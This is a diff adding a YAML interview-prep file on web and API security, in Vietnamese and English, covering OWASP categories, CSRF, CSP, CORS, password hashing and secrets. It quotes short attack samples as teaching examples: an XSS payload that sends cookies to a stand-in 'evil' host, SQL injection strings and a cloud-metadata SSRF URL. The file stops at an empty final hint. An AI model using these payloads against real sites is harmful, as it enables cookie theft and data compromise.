@@ -1,0 +1,1035 @@
+id: 22-web-security
+slug: web-security
+title: Web & API Security
+tier: 6
+status: drafted
+summary: OWASP Top 10:2025, XSS/CSRF/SQLi/SSRF, IDOR/BOLA, CSP, CORS, secrets, password hashing, supply chain, API security checklist.
+cvLinked: true
+prerequisites: []
+overview: |-
+  ## TL;DR
+
+  - Lỗi bảo mật phổ biến nhất ở backend hiện đại **không phải** SQL injection mà là **Broken Access Control** (IDOR/BOLA, thiếu check tenant) — đứng #1 cả OWASP Top 10:2021 lẫn 2025, và API1 trong OWASP API Security Top 10:2023.
+  - Tư duy đúng: **mọi input không đáng tin** (body, header, cookie, JWT claim chưa verify, file, URL, webhook), **mọi output phải encode theo context**, **mọi resource phải check quyền ở object level**.
+  - Browser security là các cơ chế riêng rẽ, dễ nhầm: **SOP** (chặn đọc cross-origin), **CORS** (nới SOP có kiểm soát — không bảo vệ server), **CSRF** (lợi dụng credential tự gửi kèm), **CSP** (giới hạn script được chạy — lớp phòng thủ thứ hai cho XSS).
+  - Defense in depth: validation → parameterized query → authorization → rate limit → logging/alerting → secrets & crypto đúng → supply chain.
+  - Senior interview hỏi **tình huống**: key bị lộ, credential stuffing, tenant thấy dữ liệu tenant khác — bạn làm gì trong 1 giờ đầu?
+
+  ## Khái niệm cốt lõi
+
+  | Khái niệm | Một câu | Ví dụ ngắn |
+  |---|---|---|
+  | XSS | Attacker chèn script chạy trong origin của bạn | `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` trong comment |
+  | CSRF | Site khác khiến browser nạn nhân gửi request **kèm cookie** | Form auto-submit `POST /transfer` từ evil.com |
+  | SQL injection | Input trở thành một phần của câu SQL | `' OR 1=1 --` trong `WHERE email = '${email}'` |
+  | SSRF | Server bị lừa gọi URL do attacker chọn | Webhook URL = `http://169.254.169.254/latest/meta-data/` |
+  | IDOR / BOLA | Truy cập object của người khác bằng cách đổi ID | `GET /orders/1043` trả đơn của user khác |
+  | Mass assignment | Bind toàn bộ body vào model | `{ "role": "admin" }` trong `PATCH /me` |
+  | CSP | Header khai báo nguồn script/style được phép | `script-src 'nonce-r4nd0m' 'strict-dynamic'` |
+  | CORS | Server cho phép origin khác **đọc** response | `Access-Control-Allow-Origin: https://app.example.com` |
+  | Password hashing | Hàm chậm, có salt, chống brute force | `argon2id` (m=19 MiB, t=2, p=1 theo OWASP) |
+  | Envelope encryption | Data key mã hoá dữ liệu, master key (KMS) mã hoá data key | AWS KMS `GenerateDataKey` |
+
+  ## Cơ chế hoạt động
+
+  ### CSRF: tại sao cookie là vấn đề, và các lớp chặn
+
+  ```mermaid
+  sequenceDiagram
+    participant V as Victim browser
+    participant E as evil.example
+    participant A as api.shop.com
+    V->>A: Login, receives Set-Cookie sid (session)
+    V->>E: Visits attacker page
+    E-->>V: Auto-submitting form POST api.shop.com/address
+    V->>A: POST /address + Cookie sid (browser attaches it)
+    Note over A: Defenses checked here
+    A->>A: SameSite=Lax blocks cross-site POST cookie
+    A->>A: Origin header != allowed origin -> 403
+    A->>A: Missing/invalid CSRF token -> 403
+    A-->>V: 403 Forbidden
+  ```
+
+  ### Request đi qua các lớp phòng thủ của một API
+
+  ```mermaid
+  flowchart LR
+    R["Request"] --> W["Edge: TLS, WAF,<br/>rate limit per IP"]
+    W --> AU["AuthN<br/>verify token/session"]
+    AU --> V["Validate input<br/>schema allowlist (zod)"]
+    V --> AZ["AuthZ<br/>role + object-level + tenant"]
+    AZ --> BL["Business logic<br/>parameterized queries"]
+    BL --> O["Output<br/>filter fields, encode"]
+    O --> L["Audit log<br/>no secrets / PII"]
+  ```
+
+  ### OWASP Top 10:2025 (so với 2021)
+
+  | 2025 | Ghi chú |
+  |---|---|
+  | A01 Broken Access Control | Vẫn #1; SSRF được gộp vào đây |
+  | A02 Security Misconfiguration | Lên từ #5 |
+  | A03 Software Supply Chain Failures | Mở rộng từ "Vulnerable and Outdated Components" |
+  | A04 Cryptographic Failures | Xuống từ #2 |
+  | A05 Injection | Gồm cả XSS |
+  | A06 Insecure Design | |
+  | A07 Authentication Failures | |
+  | A08 Software or Data Integrity Failures | |
+  | A09 Security Logging and Alerting Failures | Đổi tên, nhấn mạnh alerting |
+  | A10 Mishandling of Exceptional Conditions | Mới: fail-open, lỗi xử lý exception |
+
+  ## Trade-offs
+
+  | Quyết định | Lựa chọn A | Lựa chọn B | Ghi chú |
+  |---|---|---|---|
+  | Token ở browser | HttpOnly cookie (cần chống CSRF) | `Authorization` header từ JS memory (cần chống XSS) | BFF + cookie thường an toàn nhất cho SPA |
+  | CSP | Strict (nonce + `strict-dynamic`) | Allowlist domain | Allowlist dễ bị bypass qua JSONP/CDN chung |
+  | Sanitize HTML | Server-side (DOMPurify/jsdom, sanitize-html) | Client-side khi render | Làm cả hai nếu lưu rich text; encode vẫn là mặc định |
+  | Rate limit khi hạ tầng lỗi | Fail-open | Fail-closed | Login/OTP → closed; read API → open + alert |
+  | Password hash | argon2id | bcrypt | bcrypt vẫn chấp nhận được; chú ý giới hạn 72 byte |
+  | Secrets | Env var inject lúc runtime | Secrets manager + short-lived creds | Không bao giờ trong git/image |
+
+  ## Pitfalls
+
+  - Check quyền ở **route** (`requireRole('admin')`) nhưng không check **object thuộc về ai/tenant nào**.
+  - `cors({ origin: true, credentials: true })` = mọi site đọc được API bằng cookie của user.
+  - Tin `X-Forwarded-For`/`X-Tenant-Id` từ client; `app.set('trust proxy', true)` sai chỗ.
+  - `dangerouslySetInnerHTML`, `href={userUrl}` (`javascript:`), nhúng JSON vào `<script>` khi SSR mà không escape `</script>`.
+  - Log nguyên `req.body`/header → lộ password, token, PII vào log hệ thống.
+  - Hash password bằng SHA-256/MD5 (nhanh = dễ brute force); so sánh token bằng `===` (timing).
+  - Validate bằng denylist ("chặn `<script>`") thay vì allowlist schema + output encoding.
+  - `npm install` package mới không xem maintainer/`postinstall`; không commit lockfile.
+
+  ## Cheat sheet
+
+  - Headers: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors` (thay `X-Frame-Options`), `Permissions-Policy`; bỏ `X-XSS-Protection` (deprecated).
+  - Cookie session: `HttpOnly; Secure; SameSite=Lax; Path=/` + prefix `__Host-`.
+  - SQL: luôn parameterized; identifier (cột ORDER BY) → allowlist.
+  - AuthZ: deny by default, check object + tenant ở service layer, test cross-tenant.
+  - SSRF: allowlist host, resolve DNS rồi chặn private/link-local/metadata IP, không follow redirect mù, IMDSv2.
+  - Password: argon2id/bcrypt/scrypt, salt tự sinh, rate limit + breached-password check, MFA.
+  - Supply chain: lockfile, `npm ci`, review dependency mới, pin action theo SHA, provenance/SBOM, tắt install scripts khi có thể.
+  - Log: structured, redact, correlation id; alert trên pattern tấn công.
+notionRefs:
+  - title: Web Security
+    url: https://app.notion.com/p/179ef77f8ab28020a845e84fc02baa71
+  - title: reCaptcha
+    url: https://app.notion.com/p/39cef77f8ab2802cab69d57870ab2110
+references:
+  - title: OWASP Top 10:2025
+    url: https://owasp.org/Top10/2025/
+  - title: OWASP API Security Top 10 (2023)
+    url: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
+  - title: OWASP Cheat Sheet — Cross-Site Request Forgery Prevention
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Cross Site Scripting Prevention
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Password Storage
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Server Side Request Forgery Prevention
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Mass Assignment
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Secrets Management
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — Logging
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+  - title: OWASP Cheat Sheet — HTTP Headers
+    url: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+  - title: MDN — Content Security Policy (CSP)
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
+  - title: MDN — Cross-Origin Resource Sharing (CORS)
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
+  - title: MDN — Set-Cookie (SameSite, cookie prefixes)
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie
+  - title: web.dev — Mitigate XSS with a strict CSP
+    url: https://web.dev/articles/strict-csp
+  - title: NIST SP 800-63B — Digital Identity Guidelines (Authentication)
+    url: https://pages.nist.gov/800-63-4/sp800-63b.html
+  - title: npm Docs — Generating provenance statements
+    url: https://docs.npmjs.com/generating-provenance-statements
+  - title: Express — Behind proxies (trust proxy)
+    url: https://expressjs.com/en/guide/behind-proxies.html
+questions:
+  - id: web-security-001
+    level: easy
+    type: concept
+    q: Name the OWASP Top 10 categories in the current edition. What changed compared with 2021?
+    hint: |-
+      Top 10:2025: A01 Broken Access Control · A02 Security Misconfiguration · A03 Software Supply Chain Failures · A04 Cryptographic Failures · A05 Injection · A06 Insecure Design · A07 Authentication Failures · A08 Software or Data Integrity Failures · A09 Security Logging and Alerting Failures · A10 Mishandling of Exceptional Conditions.
+      Thay đổi chính so với 2021: **SSRF gộp vào A01**, supply chain mở rộng thành category riêng (#3), misconfiguration lên #2, category mới A10 (xử lý lỗi/điều kiện bất thường, fail-open).
+      Ý nghĩa thực tế: access control vẫn là lỗi số một → ưu tiên check quyền ở object level.
+    followUp: Why do you think SSRF was folded into Broken Access Control?
+    verify: true
+    tags: [owasp]
+  - id: web-security-002
+    level: easy
+    type: concept
+    q: What are the three main types of XSS? Give a realistic example of each in a web app.
+    hint: |-
+      - **Stored**: payload lưu trong DB (review sản phẩm, tên shop) → chạy với mọi người xem, kể cả admin. Nguy hiểm nhất.
+      - **Reflected**: payload trong URL/param được server phản chiếu vào HTML (`/search?q=<script>`) → cần lừa nạn nhân bấm link.
+      - **DOM-based**: JS phía client đọc nguồn không tin cậy (`location.hash`) và ghi vào sink nguy hiểm (`innerHTML`, `eval`) — server không thấy payload.
+      Hậu quả: gọi API thay user (cookie HttpOnly không cứu được việc này), đọc dữ liệu trên trang, keylog, đổi email → chiếm tài khoản.
+    followUp: If the session cookie is HttpOnly, what can an attacker still do with XSS?
+    redFlags:
+      - "HttpOnly cookies prevent XSS"
+    tags: [xss]
+  - id: web-security-003
+    level: easy
+    type: concept
+    q: What is CSRF, and under which authentication setups is an app vulnerable?
+    hint: |-
+      CSRF: site khác khiến browser nạn nhân gửi request **thay đổi state** tới app của bạn, browser **tự đính kèm credential** → server tưởng user thật.
+      Dễ bị khi credential được browser tự gửi: **cookie** session/JWT-in-cookie, HTTP Basic/Digest, client certificate, xác thực theo IP mạng nội bộ.
+      Ít bị khi token nằm trong header `Authorization` do JS gắn (browser không tự gửi) — nhưng khi đó token phải lưu ở chỗ JS đọc được → rủi ro XSS.
+      Đừng quên **login CSRF** (ép nạn nhân đăng nhập vào tài khoản attacker).
+    followUp: Why does a JSON API that only accepts `Content-Type application/json` still need to think about CSRF?
+    tags: [csrf]
+  - id: web-security-004
+    level: easy
+    type: concept
+    q: How does SQL injection happen, and why are parameterized queries the fix rather than escaping?
+    hint: |-
+      Injection xảy ra khi input được **nối chuỗi** vào câu SQL → input thay đổi cấu trúc câu lệnh (`' OR '1'='1`, `; DROP TABLE`).
+      Parameterized query/prepared statement gửi **câu lệnh và dữ liệu tách riêng** → DB không bao giờ parse dữ liệu thành SQL.
+      Escape thủ công dễ sai (charset, context số vs chuỗi, identifier). ORM an toàn **trừ khi** dùng raw query nối chuỗi.
+      Giới hạn: tham số không dùng được cho **identifier** (tên cột, ORDER BY, tên bảng) → dùng allowlist.
+    example: |-
+      ```ts
+      // Vulnerable
+      await db.query(`SELECT * FROM users WHERE email = '${email}'`);
+      // Safe
+      await db.query('SELECT * FROM users WHERE email = $1', [email]);
+      ```
+    followUp: How do you safely support a user-selected sort column?
+    tags: [sql-injection, injection]
+  - id: web-security-005
+    level: easy
+    type: compare
+    q: What is the Same-Origin Policy, and how does CORS relate to it?
+    hint: |-
+      **Origin** = scheme + host + port. SOP: script ở origin A **không được đọc** response/DOM của origin B. SOP **không chặn gửi** request (form, img, fetch no-cors vẫn đi) — đó là lý do CSRF tồn tại.
+      **CORS**: cơ chế để server B **nới** SOP, cho phép origin cụ thể đọc response (`Access-Control-Allow-Origin`), kèm credential (`Allow-Credentials`), preflight `OPTIONS` cho request "không đơn giản".
+      CORS là **bảo vệ cho user trên browser**, không bảo vệ server: curl/Postman bỏ qua CORS hoàn toàn.
+    followUp: Is `https://app.example.com` the same origin as `https://api.example.com`? Same site?
+    redFlags:
+      - "CORS protects my API from unauthorized clients"
+    tags: [sop, cors]
+  - id: web-security-006
+    level: easy
+    type: compare
+    q: Hashing vs encryption vs encoding — when do you use each?
+    hint: |-
+      - **Encoding** (base64, URL encoding): chuyển định dạng, **không có bí mật**, ai cũng decode được. JWT payload chỉ là base64url!
+      - **Hashing**: một chiều. Integrity (SHA-256 checksum), password (**slow hash** argon2id/bcrypt + salt), HMAC có key để xác thực message (webhook signature).
+      - **Encryption**: hai chiều có key. Symmetric (AES-256-GCM) cho dữ liệu, asymmetric (RSA/ECDH) cho trao đổi key/chữ ký.
+      Password → hash (không cần giải mã). PII cần đọc lại (số điện thoại) → encrypt.
+    followUp: Why must you use a MAC or an AEAD mode rather than plain AES-CBC for data you decrypt later?
+    tags: [cryptography, hashing]
+  - id: web-security-007
+    level: easy
+    type: concept
+    q: What does HTTPS/TLS actually guarantee, and what doesn't it protect against?
+    hint: |-
+      TLS đảm bảo **confidentiality** (mã hoá trên đường truyền), **integrity** (không bị sửa), **server authentication** (certificate đúng domain qua CA).
+      Không bảo vệ: dữ liệu ở server/log/DB, XSS/SQLi, endpoint bị compromise, user bị phishing domain giống, API logic sai.
+      Bổ sung: **HSTS** (ép HTTPS, chống SSL stripping), TLS 1.2+ (ưu tiên 1.3), mTLS cho service-to-service khi cần xác thực client.
+    followUp: What attack does HSTS preload prevent that plain HSTS cannot?
+    tags: [tls, https]
+  - id: web-security-008
+    level: easy
+    type: concept
+    q: What are IDOR and BOLA? Why is it the most common API vulnerability?
+    hint: |-
+      **IDOR** (Insecure Direct Object Reference) / **BOLA** (Broken Object Level Authorization, API1:2023): API nhận ID object từ client và trả/sửa object **mà không kiểm tra** user hiện tại có quyền với object đó.
+      Phổ biến vì: authentication middleware làm dev tưởng "đã bảo mật"; check quyền phải viết **ở từng query** nên dễ quên; scanner tự động khó phát hiện (cần hiểu ai sở hữu gì).
+      Fix: scope query theo owner/tenant (`WHERE id = $1 AND tenant_id = $2`), policy check tập trung, test tự động với 2 user/2 tenant. UUID **không** phải fix (chỉ làm khó đoán).
+    followUp: Does switching from sequential IDs to UUIDs fix IDOR?
+    redFlags:
+      - "We use UUIDs so IDOR is not possible"
+    tags: [idor, bola, authorization]
+  - id: web-security-009
+    level: easy
+    type: concept
+    q: Why is storing passwords as SHA-256 hashes (even with a salt) considered insecure?
+    hint: |-
+      SHA-256 được thiết kế để **nhanh** — GPU tính hàng tỷ hash/giây → brute force/dictionary attack lên DB bị lộ rất rẻ. Salt chỉ chặn rainbow table và việc crack hàng loạt cùng lúc, không làm chậm từng lần thử.
+      Dùng **password hashing function** chậm và (tốt nhất) **memory-hard**: argon2id (ưu tiên), scrypt, bcrypt; PBKDF2 khi cần FIPS.
+      Thư viện tự sinh salt và nhúng tham số vào chuỗi hash → dễ tăng cost sau này (rehash khi user login).
+    followUp: How do you migrate millions of existing SHA-256 hashes to argon2id without forcing a password reset?
+    tags: [password-hashing, cryptography]
+  - id: web-security-010
+    level: easy
+    type: concept
+    q: Which HTTP security headers do you set on every web app, and what does each one do?
+    hint: |-
+      - `Strict-Transport-Security: max-age=63072000; includeSubDomains` — ép HTTPS.
+      - `Content-Security-Policy` — giới hạn nguồn script/style/frame (lớp 2 chống XSS), `frame-ancestors 'none'` chống clickjacking.
+      - `X-Content-Type-Options: nosniff` — chặn MIME sniffing.
+      - `Referrer-Policy: strict-origin-when-cross-origin` (hoặc chặt hơn) — không lộ path/query.
+      - `Permissions-Policy` — tắt camera/geolocation không dùng.
+      - Tuỳ nhu cầu: COOP/COEP/CORP cho isolation. `X-XSS-Protection` đã deprecated → không bật (đặt `0` hoặc bỏ).
+      Node: `helmet` là điểm bắt đầu, vẫn phải tự cấu hình CSP.
+    followUp: Why is `X-Frame-Options` considered legacy, and what replaces it?
+    verify: true
+    tags: [headers, csp, hsts]
+  - id: web-security-011
+    level: easy
+    type: concept
+    q: Explain least privilege and defense in depth with one concrete example each from a Node.js backend.
+    hint: |-
+      - **Least privilege**: mỗi thành phần chỉ có quyền tối thiểu. Ví dụ: DB user của API không có quyền `DROP`/DDL (migration dùng user khác); IAM role của service chỉ `s3:GetObject` trên một prefix; container chạy non-root.
+      - **Defense in depth**: nhiều lớp độc lập, một lớp fail vẫn còn lớp khác. Ví dụ tenant isolation: filter `tenant_id` ở repository **+** Row-Level Security ở DB **+** test cross-tenant **+** audit log.
+      Ý chính: giả định mỗi lớp sẽ có lúc thủng.
+    followUp: What permissions does your production API's database user have today?
+    tags: [least-privilege, defense-in-depth]
+  - id: web-security-012
+    level: easy
+    type: concept
+    q: A teammate commits a `.env` file with the production database password and then deletes it in the next commit. Is the problem solved?
+    hint: |-
+      Không. Secret vẫn nằm trong **git history** (và trong mọi clone, fork, CI cache, bản mirror). Bot quét GitHub public tìm key trong vài phút.
+      Việc đúng: coi như **đã lộ** → **rotate** secret ngay (đổi password/key), kiểm tra log truy cập, sau đó mới dọn history (git filter-repo/BFG) nếu cần.
+      Phòng ngừa: `.gitignore`, pre-commit secret scanning (gitleaks, trufflehog), GitHub push protection, secrets manager thay vì file.
+    followUp: Which secrets are the hardest to rotate in your system, and why?
+    redFlags:
+      - "Delete the file and force-push, done"
+    tags: [secrets]
+  - id: web-security-013
+    level: medium
+    type: gotcha
+    q: React escapes output by default. Name the ways XSS still happens in a React/Next.js app.
+    hint: |-
+      - `dangerouslySetInnerHTML` với HTML chưa sanitize (rich text, markdown render).
+      - URL do user kiểm soát trong `href`/`src`: `javascript:alert(1)` — React chỉ cảnh báo, cần allowlist scheme `http/https/mailto`.
+      - SSR nhúng state vào `<script>` bằng `JSON.stringify` không escape `</script>` và `<` → phá thẻ script.
+      - Truy cập DOM trực tiếp (`ref.current.innerHTML`), thư viện bên thứ ba (chart tooltip HTML, markdown lib cho phép raw HTML).
+      - Template phía server khác (email, PDF), hoặc prop spread `{...userProps}` vào element.
+    example: |-
+      ```tsx
+      <a href={profile.website}>Website</a>           // javascript: URL runs on click
+      <div dangerouslySetInnerHTML={{ __html: review.body }} /> // stored XSS
+      ```
+    followUp: How would you sanitize user-supplied rich text, and where — on save or on render?
+    tags: [xss, react, nextjs]
+  - id: web-security-014
+    level: medium
+    type: concept
+    q: Explain a strict CSP based on nonces and `strict-dynamic`. Why is it preferred over an allowlist of domains, and how do you roll it out safely?
+    hint: |-
+      Strict CSP: `script-src 'nonce-{random per response}' 'strict-dynamic'; object-src 'none'; base-uri 'none'` (hoặc hash cho trang tĩnh). Chỉ script có nonce đúng mới chạy; `strict-dynamic` cho phép script đó load script con, bỏ qua allowlist host.
+      Allowlist domain yếu vì domain được phép thường có **JSONP endpoint** hoặc host thư viện cũ (Angular) → bypass; danh sách dài khó bảo trì.
+      Nonce phải **ngẫu nhiên mỗi response** (không cache HTML dùng chung nonce), không bao giờ echo từ input.
+      Rollout: `Content-Security-Policy-Report-Only` + `report-to`, thu thập vi phạm, sửa inline handler (`onclick=`), rồi enforce.
+    example: |-
+      ```text
+      Content-Security-Policy:
+        script-src 'nonce-9f2c1a7e' 'strict-dynamic' https: 'unsafe-inline';
+        object-src 'none'; base-uri 'none'; frame-ancestors 'none';
+      # 'unsafe-inline' and https: are ignored by CSP3 browsers when a nonce/strict-dynamic is present;
+      # they only serve as fallbacks for very old browsers.
+      ```
+    followUp: Your Next.js pages are statically generated and cached on a CDN. How does that interact with nonce-based CSP?
+    verify: true
+    tags: [csp, xss]
+  - id: web-security-015
+    level: medium
+    type: compare
+    q: SameSite=Strict vs Lax vs None. Is SameSite alone enough to stop CSRF?
+    hint: |-
+      - **Strict**: không gửi cookie trong mọi request cross-site (kể cả bấm link từ email → user trông như bị logout).
+      - **Lax**: gửi cookie khi **top-level navigation GET** cross-site, chặn POST/iframe/fetch cross-site. Chrome áp Lax mặc định khi không khai báo (các browser khác có thể khác).
+      - **None**: luôn gửi, bắt buộc `Secure` — cần cho embed/iframe bên thứ ba.
+      Không đủ một mình: "site" = eTLD+1 → **subdomain khác** (bị takeover, user content) vẫn là same-site; GET có side effect vẫn bị Lax cho qua; browser cũ. OWASP coi SameSite là **defense in depth**, vẫn nên có token hoặc kiểm tra `Origin`/`Sec-Fetch-Site`.
+    followUp: Why is `https://evil.github.io` same-site or cross-site with `https://victim.github.io`?
+    verify: true
+    tags: [csrf, cookies, samesite]
+  - id: web-security-016
+    level: medium
+    type: compare
+    q: Compare CSRF defenses — synchronizer token, signed double-submit cookie, Origin/Fetch Metadata checks, and requiring a custom header.
+    hint: |-
+      - **Synchronizer token**: token random lưu trong session server, gửi kèm form/header → mạnh nhất cho app stateful.
+      - **Signed double-submit**: cookie chứa token (HMAC gắn với session id) + header cùng giá trị → stateless; bản "naive" không ký dễ bị cookie injection từ subdomain.
+      - **Origin / `Sec-Fetch-Site` check**: từ chối request state-changing có Origin lạ hoặc `Sec-Fetch-Site: cross-site` → rẻ, hiệu quả với browser hiện đại.
+      - **Custom header** (`X-Requested-With`) cho API JSON: form HTML không thêm được header, fetch cross-origin có header lạ phải qua **preflight CORS** → chỉ an toàn nếu CORS cấu hình chặt.
+      Kết hợp: SameSite=Lax + Origin check + token cho form nhạy cảm.
+    followUp: Your CORS config allows any origin. Which of these defenses just stopped working?
+    tags: [csrf]
+  - id: web-security-017
+    level: medium
+    type: gotcha
+    q: List the most common misconceptions about CORS that you see in code reviews.
+    hint: |-
+      - "CORS bảo vệ API" — sai: chỉ browser thực thi; attacker dùng curl.
+      - "Lỗi CORS nghĩa là request không tới server" — sai: simple request **đã chạy** trên server, browser chỉ chặn đọc response → side effect vẫn xảy ra.
+      - `Access-Control-Allow-Origin: *` với credentials — browser từ chối; dev "fix" bằng cách **reflect** `Origin` → mọi site đọc được dữ liệu user.
+      - So khớp origin bằng `endsWith('example.com')` → `evilexample.com` qua; regex không escape dấu chấm.
+      - Cho phép `null` origin (sandboxed iframe, file://) · quên `Vary: Origin` khi response phụ thuộc Origin → CDN cache sai.
+      - Nghĩ preflight là cơ chế bảo mật cho mọi request.
+    followUp: Which requests trigger a preflight, and which don't?
+    tags: [cors]
+  - id: web-security-018
+    level: medium
+    type: concept
+    q: What is SSRF, why is it especially dangerous in the cloud, and how do you defend a feature that fetches user-supplied URLs?
+    hint: |-
+      SSRF: server gửi request tới URL do attacker chọn → truy cập mạng nội bộ (admin panel, Redis, Elasticsearch không auth), **cloud metadata** (`169.254.169.254` → credential IAM tạm thời).
+      Tính năng hay dính: webhook, link preview, import từ URL, PDF renderer, image proxy.
+      Phòng: allowlist domain nếu được; resolve DNS và **chặn IP private/loopback/link-local/IPv6 tương đương**, dùng IP đã resolve để kết nối (chống **DNS rebinding**); không follow redirect (hoặc validate lại từng hop); chỉ `http/https`; timeout + size limit; chạy fetcher trong network segment không có đường vào nội bộ; bật **IMDSv2** (token qua PUT, hop limit).
+    followUp: Why is validating the hostname string alone insufficient? Give two bypasses.
+    tags: [ssrf, cloud]
+  - id: web-security-019
+    level: medium
+    type: concept
+    q: What is mass assignment (Broken Object Property Level Authorization), and how do you prevent it in a TypeScript API?
+    hint: |-
+      Framework/ORM bind nguyên request body vào model → attacker gửi thêm field không được phép (`role`, `isVerified`, `tenantId`, `price`, `balance`).
+      OWASP API3:2023 **BOPLA** gộp mass assignment (ghi) và excessive data exposure (đọc — trả về field nhạy cảm như `passwordHash`).
+      Phòng: **allowlist DTO** bằng schema (zod `.strict()` / class-validator `whitelist + forbidNonWhitelisted`), map tường minh sang update; field theo role (admin mới sửa `status`); response DTO chọn field, không trả entity nguyên.
+    example: |-
+      ```ts
+      const UpdateProfile = z.object({ displayName: z.string().max(80), phone: z.string().optional() }).strict();
+      app.patch('/me', async (req, res) => {
+        const input = UpdateProfile.parse(req.body);           // rejects { role: 'admin' }
+        res.json(toProfileDto(await users.update(req.user.id, input)));
+      });
+      ```
+    followUp: How would you let admins edit `status` but not regular users, using the same endpoint?
+    tags: [mass-assignment, bopla, validation]
+  - id: web-security-020
+    level: medium
+    type: concept
+    q: How should passwords be hashed today? Give concrete argon2id and bcrypt parameters and their pitfalls.
+    hint: |-
+      OWASP Password Storage Cheat Sheet: **argon2id** tối thiểu m=19 MiB, t=2, p=1 (hoặc các cặp tương đương); nếu không có: scrypt (N=2^17, r=8, p=1), bcrypt cost ≥ 10, PBKDF2-HMAC-SHA256 ~600 000 iteration (FIPS).
+      Pitfalls bcrypt: **giới hạn 72 byte** input (passphrase dài/Unicode bị cắt), null byte ở một số implementation; pre-hash bằng SHA-256 phải encode base64 để tránh null byte.
+      Chung: tune cost để hash ~vài trăm ms trên phần cứng thật, **rehash khi login** nếu tham số cũ, pepper (secret riêng trong KMS) là tuỳ chọn, hash chạy trong threadpool (Node `argon2` native) — cẩn thận DoS bằng password dài (giới hạn độ dài input).
+    followUp: How does password hashing cost interact with a login endpoint's DoS risk?
+    verify: true
+    tags: [password-hashing, argon2, bcrypt]
+  - id: web-security-021
+    level: medium
+    type: concept
+    q: Explain encryption at rest vs in transit, and how envelope encryption with a KMS works for a PII column.
+    hint: |-
+      - **In transit**: TLS giữa client–LB–service–DB (kể cả trong VPC nếu yêu cầu compliance).
+      - **At rest**: disk/volume encryption (RDS, EBS, S3 SSE) — chỉ bảo vệ khi **mất ổ đĩa/snapshot**, không bảo vệ khi attacker query được DB qua app.
+      - **Application-level / field-level** encryption cho PII nhạy cảm: **envelope** — KMS sinh data key (DEK), dữ liệu mã hoá bằng DEK (AES-256-GCM), lưu DEK đã mã hoá bằng master key (KEK, không rời KMS) cạnh ciphertext.
+      Trade-off: không query/search được trên cột mã hoá (cần blind index = HMAC để tìm exact match), chi phí KMS call (cache DEK), quản lý key rotation.
+    followUp: How do you look up a user by an encrypted phone number?
+    tags: [encryption, kms, pii]
+  - id: web-security-022
+    level: medium
+    type: concept
+    q: How do you protect a login endpoint against brute force and credential stuffing without locking out real users?
+    hint: |-
+      - Rate limit **nhiều chiều**: per account, per IP, per IP range/ASN, toàn cục; backoff tăng dần thay vì khoá cứng (khoá cứng = attacker DoS được nạn nhân).
+      - Phát hiện credential stuffing: tỷ lệ fail cao, nhiều username khác nhau từ ít IP, device fingerprint.
+      - Challenge có điều kiện (CAPTCHA / proof-of-work) khi rủi ro cao; **MFA / passkey** là giải pháp gốc.
+      - Kiểm tra password trong danh sách bị lộ (HIBP k-anonymity) khi đăng ký/đổi.
+      - Response đồng nhất (không lộ "email không tồn tại"), thời gian phản hồi gần giống nhau.
+      - Alert + notify user khi login lạ.
+    followUp: Attackers rotate through 50,000 residential IPs. Which of your controls still work?
+    tags: [brute-force, credential-stuffing, authentication]
+  - id: web-security-023
+    level: medium
+    type: concept
+    q: Walk me through the OWASP API Security Top 10 (2023). Which three matter most for a typical Node.js REST API?
+    hint: |-
+      API1 BOLA · API2 Broken Authentication · API3 BOPLA (mass assignment + excessive data exposure) · API4 Unrestricted Resource Consumption · API5 Broken Function Level Authorization · API6 Unrestricted Access to Sensitive Business Flows · API7 SSRF · API8 Security Misconfiguration · API9 Improper Inventory Management · API10 Unsafe Consumption of APIs.
+      Thường quan trọng nhất: **BOLA** (check object/tenant), **BFLA** (endpoint admin không check role), **resource consumption** (không giới hạn page size, upload, GraphQL depth).
+      API6 đáng chú ý cho e-commerce: bot mua hết hàng flash sale, spam tạo tài khoản lấy voucher.
+    followUp: Give an example of "unsafe consumption of APIs" from integrating a payment or shipping provider.
+    verify: true
+    tags: [owasp, api-security]
+  - id: web-security-024
+    level: medium
+    type: concept
+    q: How should a Node.js service on AWS or Kubernetes get its secrets? What's wrong with baking them into environment files?
+    hint: |-
+      - Nguồn: **secrets manager** (AWS Secrets Manager/SSM Parameter Store, Vault, GCP Secret Manager), inject lúc runtime (ESO/CSI driver trên K8s), hoặc tốt hơn: **không có secret** — IAM role (IRSA / EKS Pod Identity), workload identity, RDS IAM auth, OIDC federation cho CI.
+      - File `.env`/image: lộ qua git, image layer, `docker inspect`, crash dump, log; rotate phải redeploy; không audit ai đọc.
+      - Env var vẫn có rủi ro (process listing, child process, error reporter gửi `process.env`) → không log env, hạn chế scope.
+      - Rotation: hỗ trợ 2 secret song song (current + previous), short-lived credentials.
+      - K8s Secret chỉ base64 → bật encryption at rest cho etcd + RBAC.
+    followUp: How do you rotate a database password with zero downtime?
+    tags: [secrets, aws, kubernetes]
+  - id: web-security-025
+    level: medium
+    type: concept
+    q: How do you design application logging that is useful for security investigations but doesn't leak secrets or PII?
+    hint: |-
